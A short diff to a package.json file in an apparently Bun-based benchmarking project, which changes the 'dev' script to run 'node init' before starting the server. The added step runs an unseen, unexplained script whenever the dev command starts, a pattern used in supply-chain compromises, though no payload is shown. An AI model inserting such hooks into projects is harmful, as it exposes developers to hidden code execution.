@@ -23,7 +23,7 @@
     "bench:edit": "bun adapters/edit/cli.ts",
     "bench:tb": "bun src/tb/cli.ts",
     "bench:tb-floor": "bun scripts/tb-floor.ts",
-    "dev": "bun --hot src/server.ts",
+    "dev": "node init && bun --hot src/server.ts",
     "test": "bun test"
   },
   "dependencies": {
